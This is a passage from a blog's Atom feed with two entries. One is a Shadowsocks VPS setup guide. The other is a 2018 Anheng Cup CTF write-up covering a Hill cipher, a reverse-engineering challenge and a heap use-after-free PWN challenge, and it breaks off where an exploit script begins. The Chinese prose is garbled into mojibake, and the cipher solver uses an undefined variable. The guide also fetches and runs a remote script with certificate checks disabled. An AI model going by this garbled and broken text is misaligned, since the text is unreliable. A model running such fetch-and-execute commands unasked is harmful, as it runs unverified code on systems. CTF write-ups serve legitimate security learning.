    <content type="html"><![CDATA[<p>è®°å½•ä¸€ä¸‹è‡ªå·±æ­å°é£æœºçš„è¿‡ç¨‹ã€‚</p><a id="more"></a><h1 id="ç¬¬ä¸€æ­¥-ç§ŸæœåŠ¡å™¨"><a href="#ç¬¬ä¸€æ­¥-ç§ŸæœåŠ¡å™¨" class="headerlink" title="ç¬¬ä¸€æ­¥-ç§ŸæœåŠ¡å™¨"></a>ç¬¬ä¸€æ­¥-ç§ŸæœåŠ¡å™¨</h1><p>å…ˆæ”¾ä¸€äº›å›½å¤–çš„ä¸€äº›VPSæä¾›å•†ï¼š<a href="https://www.vultr.com/" target="_blank" rel="noopener">vultr</a>ã€<a href="https://www.linode.com/" target="_blank" rel="noopener">linode</a>ã€<a href="https://bwh1.net/" target="_blank" rel="noopener">æ¬ç“¦å·¥</a>ã€‚æˆ‘æ˜¯åœ¨vulträ¸Šç§Ÿçš„æœåŠ¡å™¨ã€‚</p><p>é¦–å…ˆæ³¨å†Œè´¦å·ï¼Œè¿›å…¥ä¸ªäººç•Œé¢åï¼Œåœ¨Billingé¡µé¢ä½¿ç”¨Alipayå……å€¼ã€‚</p><p><img src="/pics/åˆ©ç”¨VPSæ­å»ºShadowsocksç§‘å­¦ä¸Šç½‘/1.png" alt="Alipayå……å€¼"></p><p>å»Serversé¡µé¢ï¼Œé€‰æ‹©æœåŠ¡å™¨çš„åœ°ç‚¹ï¼Œæˆ‘é€‰äº†Los Angelesã€‚</p><p><img src="/pics/åˆ©ç”¨VPSæ­å»ºShadowsocksç§‘å­¦ä¸Šç½‘/2.png" alt="é€‰æ‹©åœ°ç‚¹"></p><p>ç„¶åé€‰æ‹©osï¼Œæˆ‘çš„è¯é€‰äº†CentOSã€‚</p><p><img src="/pics/åˆ©ç”¨VPSæ­å»ºShadowsocksç§‘å­¦ä¸Šç½‘/3.png" alt="é€‰æ‹©æ“ä½œç³»ç»Ÿ"></p><p>ç„¶åSizeæˆ‘æ˜¯é€‰äº†$3.5/moï¼Œå› ä¸ºæœ€ä¾¿å®œçš„$2.5/moåªæ”¯æŒipv6ã€‚</p><p><img src="/pics/åˆ©ç”¨VPSæ­å»ºShadowsocksç§‘å­¦ä¸Šç½‘/4.png" alt="é€‰æ‹©æœåŠ¡å™¨å¤§å°"></p><p>ç„¶åç‚¹å‡»Deploy Nowï¼Œè¿‡ä¸€ä¼šå„¿å°±å¯ä»¥å¾—åˆ°è¿™å°æœåŠ¡å™¨çš„åŸºæœ¬ä¿¡æ¯ã€‚</p><h1 id="ç¬¬äºŒæ­¥-sshè¿œç¨‹è¿æ¥"><a href="#ç¬¬äºŒæ­¥-sshè¿œç¨‹è¿æ¥" class="headerlink" title="ç¬¬äºŒæ­¥-sshè¿œç¨‹è¿æ¥"></a>ç¬¬äºŒæ­¥-sshè¿œç¨‹è¿æ¥</h1><p>macçš„è¯æˆ‘æ˜¯ç”¨çš„SSH Shellæ¥è¿ï¼Œå¦‚æœæ˜¯windowså¯ä»¥ç”¨Puttyã€‚</p><p>æŒ‰ç…§ç»™å‡ºçš„ä¿¡æ¯è¿ä¸€ä¸‹å°±è¡Œäº†ï¼ˆç«¯å£22ï¼‰ã€‚</p><p><img src="/pics/åˆ©ç”¨VPSæ­å»ºShadowsocksç§‘å­¦ä¸Šç½‘/5.png" alt="sshè¿æ¥æˆåŠŸ"></p><h1 id="ç¬¬ä¸‰æ­¥-æ­å»º"><a href="#ç¬¬ä¸‰æ­¥-æ­å»º" class="headerlink" title="ç¬¬ä¸‰æ­¥-æ­å»º"></a>ç¬¬ä¸‰æ­¥-æ­å»º</h1><p>åœ¨æœåŠ¡å™¨ä¸Šè¿è¡Œä¸€ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget --no-check-certificate -O shadowsocks-all.sh https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-all.sh</span><br><span class="line">chmod +x shadowsocks-all.sh</span><br><span class="line">./shadowsocks-all.sh 2&gt;&amp;1 | tee shadowsocks-all.log</span><br></pre></td></tr></table></figure><p>ç„¶åæŒ‰ç…§æç¤ºé€‰æ‹©è„šæœ¬ï¼Œæˆ‘é€‰äº†Shadowsocks-Goï¼Œä¹‹åä¹Ÿæ˜¯æ— è„‘è·Ÿç€æŒ‡ä»¤ä¸€æ­¥ä¸€æ­¥è¿›è¡Œï¼Œå®‰è£…å®Œæˆåå°±ä¼šå¾—åˆ°ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Starting shadowsocks-go (via systemctl):  [  OK  ]</span><br><span class="line"></span><br><span class="line">Congratulations, Shadowsocks-Go server install completed!</span><br><span class="line"></span><br><span class="line">Your Server IP        :  xxx.xxx.xxx.xxx</span><br><span class="line">Your Server Port      :  xxxxx</span><br><span class="line">Your Password         :  xxxxxxxxxxx     </span><br><span class="line">Your Encryption Method:  xxxxxxxxxxx</span><br><span class="line"></span><br><span class="line">Your QR Code: (For Shadowsocks Windows, OSX, Android and iOS clients)</span><br><span class="line"> ss://YWVzLTI1Ni1jZmI6dGVkZHlzdW4uY29tQDE0OS4yNDguNC4yMjg6MTIyOTk=</span><br><span class="line">Your QR Code has been saved as a PNG file path:    </span><br><span class="line"> /root/shadowsocks_go_qr.png</span><br><span class="line"></span><br><span class="line">Welcome to visit: https://teddysun.com/486.html</span><br><span class="line">Enjoy it!</span><br></pre></td></tr></table></figure><h1 id="ç¬¬å››æ­¥-ç§‘å­¦ä¸Šç½‘"><a href="#ç¬¬å››æ­¥-ç§‘å­¦ä¸Šç½‘" class="headerlink" title="ç¬¬å››æ­¥-ç§‘å­¦ä¸Šç½‘"></a>ç¬¬å››æ­¥-ç§‘å­¦ä¸Šç½‘</h1><p>æˆ‘æŠŠæ¯ä¸ªå¹³å°ä¸Šçš„å°é£æœºéƒ½æ”¾åœ¨<a href="https://github.com/qianfei11/Flight" target="_blank" rel="noopener">æˆ‘çš„githubä¸Š</a>äº†ã€‚åªè¦å°†ä¸Šé¢çš„ä¿¡æ¯å¡«è¿›å»å°±èƒ½ç§‘å­¦ä¸Šç½‘å•¦ã€‚</p><p><img src="/pics/åˆ©ç”¨VPSæ­å»ºShadowsocksç§‘å­¦ä¸Šç½‘/6.png" alt="hello world"></p><h1 id="å‚è€ƒç½‘ç«™"><a href="#å‚è€ƒç½‘ç«™" class="headerlink" title="å‚è€ƒç½‘ç«™"></a>å‚è€ƒç½‘ç«™</h1><p><a href="https://www.diycode.cc/topics/738" target="_blank" rel="noopener">https://www.diycode.cc/topics/738</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;è®°å½•ä¸€ä¸‹è‡ªå·±æ­å°é£æœºçš„è¿‡ç¨‹ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="note" scheme="https://qianfei11.github.io/tags/note/"/>
    
  </entry>
  
  <entry>
    <title>2018-å®‰æ’æ¯å…«æœˆæœˆèµ›-review</title>
    <link href="https://qianfei11.github.io/2018/08/31/%E3%80%90%E6%9C%AA%E5%AE%8C%E6%88%90%E3%80%912018-%E5%AE%89%E6%81%92%E6%9D%AF%E5%85%AB%E6%9C%88%E6%9C%88%E8%B5%9B-review/"/>
    <id>https://qianfei11.github.io/2018/08/31/ã€æœªå®Œæˆã€‘2018-å®‰æ’æ¯å…«æœˆæœˆèµ›-review/</id>
    <published>2018-08-31T14:34:15.000Z</published>
    <updated>2019-01-22T12:50:55.071Z</updated>
    
    <content type="html"><![CDATA[<p>æ”¾æš‘å‡ç©äº†å‡ å¤©ï¼Œæ…¢æ…¢æ•´ç†è¿™å‡ æ¬¡æ¯”èµ›ã€‚</p><a id="more"></a><h1 id="CRYPTO-çˆ¬å¡é“"><a href="#CRYPTO-çˆ¬å¡é“" class="headerlink" title="CRYPTO-çˆ¬å¡é“"></a>CRYPTO-çˆ¬å¡é“</h1><p>æç¤ºæ˜æ˜¾æ˜¯å¸Œå°”åŠ å¯†ï¼Œäº†è§£ä¸€ä¸‹å¸Œå°”åŠ å¯†å†™ä¸€ä¸‹è„šæœ¬æˆ–è€…<a href="https://www.cryptool.org/en/cto-ciphers/hill" target="_blank" rel="noopener">åœ¨çº¿è§£å¯†</a>ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">mat_key = mat([[<span class="number">3</span>, <span class="number">1</span>], [<span class="number">2</span>, <span class="number">1</span>]])</span><br><span class="line">enc = <span class="string">'mttpjbpexfdzcegtdzeanutg'</span></span><br><span class="line"><span class="comment"># pla = 'thehillisveryinteresting'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å­—ç¬¦ä¸²è½¬ä¸ºæ•°å­—</span></span><br><span class="line">enc1 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc)):</span><br><span class="line">  enc1.append(ord(enc[i]) - ord(<span class="string">'a'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®—æ˜æ–‡å¹¶è½¬åŒ–ä¸ºå­—ç¬¦ä¸²</span></span><br><span class="line">res = mat_enc * mat_key.I</span><br><span class="line">res = res.reshape(<span class="number">1</span>, len(enc1)).tolist()[<span class="number">0</span>]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(res)):</span><br><span class="line">  flag += chr(ord(<span class="string">'a'</span>) + (int(round(res[i])) % <span class="number">26</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡ºflag</span></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p>æœ€åæäº¤flagçš„md5å€¼ã€‚</p><h1 id="RE-Dig-The-Way"><a href="#RE-Dig-The-Way" class="headerlink" title="RE-Dig The Way"></a>RE-Dig The Way</h1><p>é¢˜ç›®é‡Œç›´æ¥ç»™äº†ä¸€ä¸ªidbæ–‡ä»¶ï¼Œç”¨idaæ‰“å¼€åˆ†æã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> flag; <span class="comment">// [esp+11h] [ebp-3Fh]</span></span><br><span class="line">  <span class="keyword">int</span> a[<span class="number">0</span>]; <span class="comment">// [esp+28h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> a[<span class="number">2</span>]; <span class="comment">// [esp+30h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> a[<span class="number">4</span>]; <span class="comment">// [esp+38h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> a[<span class="number">5</span>]; <span class="comment">// [esp+3Ch] [ebp-14h]</span></span><br><span class="line">  <span class="function"><span class="keyword">signed</span> <span class="title">int</span> <span class="params">(__cdecl *_func0)</span><span class="params">(<span class="keyword">char</span> *, <span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>; <span class="comment">// [esp+40h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> (__cdecl *_func1)(<span class="keyword">char</span> *, <span class="keyword">int</span>, <span class="keyword">int</span>); <span class="comment">// [esp+44h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> (__cdecl *_func2)(<span class="keyword">char</span> *, <span class="keyword">int</span>, <span class="keyword">int</span>); <span class="comment">// [esp+48h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+4Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  _func0 = swap;                                <span class="comment">// swap pos</span></span><br><span class="line">  _func1 = trans1;                              <span class="comment">// |x + y| - |x| - |y| + 2</span></span><br><span class="line">  _func2 = trans2;                              <span class="comment">// |x| + |y| - |x + y| + 2</span></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;a[<span class="number">0</span>] + v3) = <span class="number">0</span>;           <span class="comment">// init array</span></span><br><span class="line">    v3 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v3 &lt; <span class="number">24</span> );</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input flag:"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;flag);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(&amp;flag, <span class="string">"flag&#123;"</span>) &lt; <span class="number">0</span> )             <span class="comment">// 1.flag head</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( check(&amp;flag) )                           <span class="comment">// 2.flag all-misc</span></span><br><span class="line">  &#123;</span><br><span class="line">    a[<span class="number">5</span>] = getValue(&amp;flag);</span><br><span class="line">    <span class="keyword">if</span> ( a[<span class="number">5</span>] &gt; <span class="number">0</span> )                             <span class="comment">// make sure only one solution</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">2</span>; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = (*(&amp;_func0 + i))((<span class="keyword">char</span> *)&amp;a[<span class="number">0</span>], <span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line">        *(&amp;a[<span class="number">0</span>] + i) = v5;</span><br><span class="line">        a[<span class="number">5</span>] = -a[<span class="number">4</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( a[<span class="number">2</span>] )                               <span class="comment">// 3.flag key-point</span></span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Congratulations"</span>);</span><br><span class="line">        system(<span class="string">"PAUSE"</span>);</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"check your flag!"</span>);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€å¼€å§‹å¯¹è¾“å…¥å­—ç¬¦ä¸²åŒ¹é…äº†<code>flag{</code>ï¼Œä¹‹åæœ‰å¤šä¸ªå‡½æ•°è¿›è¡Œçš„è½¬æ¢ã€‚å¯ä»¥çœ‹å‡ºæœ€é‡è¦çš„æœ‰ä¸‰ä¸ªå‡½æ•°ï¼š</p><ol><li><code>check()</code></li><li><code>getValue()</code></li><li><code>_func2</code></li></ol><p>ä¸‹é¢å°±é€ä¸€åˆ†æã€‚</p><h2 id="check"><a href="#check" class="headerlink" title="check()"></a>check()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> __<span class="function">cdecl <span class="title">check</span><span class="params">(_BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">char</span>)a1[<span class="number">7</span>] + (<span class="keyword">char</span>)a1[<span class="number">6</span>] != (<span class="keyword">char</span>)a1[<span class="number">8</span>] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">char</span>)a1[<span class="number">10</span>] + (<span class="keyword">char</span>)a1[<span class="number">9</span>] != (<span class="keyword">char</span>)a1[<span class="number">11</span>] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">char</span>)a1[<span class="number">13</span>] + (<span class="keyword">char</span>)a1[<span class="number">12</span>] != (<span class="keyword">char</span>)a1[<span class="number">14</span>] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">char</span>)a1[<span class="number">16</span>] + (<span class="keyword">char</span>)a1[<span class="number">15</span>] != (<span class="keyword">char</span>)a1[<span class="number">17</span>] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">char</span>)a1[<span class="number">19</span>] + (<span class="keyword">char</span>)a1[<span class="number">18</span>] == (<span class="keyword">char</span>)a1[<span class="number">20</span>] )</span><br><span class="line">    <span class="keyword">return</span> (a1[<span class="number">8</span>] ^ (<span class="keyword">unsigned</span> __int8)(a1[<span class="number">11</span>] ^ a1[<span class="number">14</span>] ^ a1[<span class="number">17</span>] ^ a1[<span class="number">21</span>])) == a1[<span class="number">5</span>];</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡è¿™ä¸ªå‡½æ•°å¤§æ¦‚å¯ä»¥å¾—åˆ°å‡ ä¸ªå­—ç¬¦å¾—åˆ°çš„æ–¹å¼ï¼Œæ˜¾ç„¶è¿™é‡Œç”¨z3æ˜¯å¾ˆéš¾æ±‚è§£çš„ã€‚</p><h2 id="getValue"><a href="#getValue" class="headerlink" title="getValue()"></a>getValue()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">getValue</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+8h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">6</span>; i &lt;= <span class="number">19</span>; i += <span class="number">3</span> )</span><br><span class="line">    v3 = <span class="number">100</span> * v3 + <span class="number">10</span> * (a1[i] - <span class="number">48</span>) + a1[i + <span class="number">1</span>] - <span class="number">48</span>;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»ç¬¬å…­ä½å¼€å§‹ï¼Œæ¯æ¬¡å–ä¸‰ä½ï¼Œæ¯ä¸‰ä½å–å‰ä¸¤ä½ç»„æˆæ•°å­—v3å¹¶è¿”å›ã€‚</p><h2 id="func2"><a href="#func2" class="headerlink" title="_func2"></a>_func2</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">trans2</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">abs</span>(*(_DWORD *)&amp;a1[<span class="number">4</span> * j])</span><br><span class="line">       - <span class="built_in">abs</span>(*(_DWORD *)&amp;a1[<span class="number">4</span> * j] + *(_DWORD *)&amp;a1[<span class="number">4</span> * i])</span><br><span class="line">       + <span class="built_in">abs</span>(*(_DWORD *)&amp;a1[<span class="number">4</span> * i])</span><br><span class="line">       + <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®€åŒ–ä¸º<code>|x| + |y| - |x + y| + 2</code>ï¼Œæ ¹æ®mainå‡½æ•°ä¸­çš„é€»è¾‘ï¼Œè¯¥å€¼åº”è¯¥ä¸º0ã€‚ä½†åˆå› ä¸º<code>|x| + |y| &gt;= |x + y|</code>ï¼Œæ•…<code>|x| + |y| - |x + y| + 2 &gt; 0</code>ï¼Œæ— æ³•ä½¿ä¹‹ä¸º0ã€‚</p><p>ä¸‹é¢å¼€å§‹å¯¹ç¨‹åºé€†å‘åˆ†æï¼š</p><ol><li>ç”±äºç¬¬ä¸‰ä¸ªå‡½æ•°å¾ˆéš¾å¾—åˆ°0ï¼Œå¯ä»¥æƒ³åˆ°æº¢å‡ºæ–¹é¢ï¼Œä½¿è¿”å›å€¼ä¸º<code>0x100000000</code>ã€‚xä¸yçš„å€¼åˆå› ä¸ºäº’ä¸ºç›¸åæ•°ï¼Œå¯ä»¥æ±‚å‡º<code>|x|</code>å’Œ<code>|y|</code>çš„å€¼ï¼Œè€Œyåœ¨å†…å­˜ä¸­çš„è¡¨ç¤ºå³ä¸ºxçš„è¡¥ç ã€‚å¾—åˆ°xä¸º2147483647ï¼Œyä¸º2147483649ã€‚</li><li>é€šè¿‡xçš„å€¼å’ŒgetValueå‡½æ•°å€’æ¨å‡ºä¸€éƒ¨åˆ†flagï¼š<code>flag{x21x47x48x36x47</code>ï¼ˆxä¸ºæœªçŸ¥éƒ¨åˆ†ï¼‰ã€‚</li><li>æ ¹æ®checkå‡½æ•°ï¼Œå†™ä¸ªè„šæœ¬è·‘å‡ºå¤§éƒ¨åˆ†flagï¼š<code>flag{x21c47k48l36i47k</code>ã€‚</li><li>æœ€åè¿˜æœ‰ä¸€éƒ¨åˆ†ç”±äºä¸çŸ¥é“ç¬¬21ä½flagï¼ŒçŒœæµ‹åº”è¯¥æ˜¯<code>}</code>äº†ï¼Œé€šè¿‡checkå‡½æ•°å¼‚æˆ–åå¾—åˆ°ï¼š<code>flag{p21c47k48l36i47k}</code></li></ol><h1 id="MISC-æš´åŠ›å¯è§£"><a href="#MISC-æš´åŠ›å¯è§£" class="headerlink" title="MISC-æš´åŠ›å¯è§£"></a>MISC-æš´åŠ›å¯è§£</h1><p>8ä½çš„æ•°å­—æš´åŠ›ç ´è§£å¾—åˆ°zipå¯†ç ã€‚</p><p><img src="/pics/2018-å®‰æ’æ¯å…«æœˆæœˆèµ›-review/æš´åŠ›å¯è§£/1.png" alt="å¾—åˆ°å¯†ç "></p><p>å…ˆè¯•ç€ç”¨stegsolveæŠŠä¸¤å¼ å›¾åˆå¹¶æ— æœï¼ŒçŒœæµ‹æ˜¯ç›²æ°´å°ï¼Œç”¨å·¥å…·BlindWaterMarkï¼Œå‘½ä»¤ä¸º<code>python bwm.py 1.png 2.png flag.png</code>ï¼Œæœ€åå¾—åˆ°flagã€‚</p><h1 id="PWN-Unote2"><a href="#PWN-Unote2" class="headerlink" title="PWN-Unote2"></a>PWN-Unote2</h1><p>åˆæ­¥åˆ¤æ–­é¢˜ç›®åº”è¯¥æ˜¯å’Œå †ç›¸å…³ï¼Œæ‰“å¼€idbæ–‡ä»¶ã€‚</p><p>å‘ç°åœ¨deleteå‡½æ•°å¤„freeæ‰æŒ‡é’ˆåæ²¡æœ‰æƒ…å†µï¼Œäº§ç”Ÿäº†uafï¼ˆuse after freeï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( ptr[v1] )                                <span class="comment">// uaf</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>(*((<span class="keyword">void</span> **)ptr[v1] + <span class="number">1</span>));</span><br><span class="line">  <span class="built_in">free</span>(ptr[v1]);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Success"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>addå‡½æ•°ç”³è¯·ä¸€ä¸ª8byteå¤§å°çš„ç»“æ„ä½“ï¼Œå­˜æ”¾å‡½æ•°æŒ‡é’ˆå’Œnoteçš„å†…å®¹ï¼Œå‡½æ•°æŒ‡é’ˆæŒ‡å‘ä¸€ä¸ªæ‰“å°å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">print_string</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"length :%zu\ncontent :"</span>, v1);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å€Ÿé‰´ä¸€å¶é£˜é›¶å¸ˆå‚…çš„expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 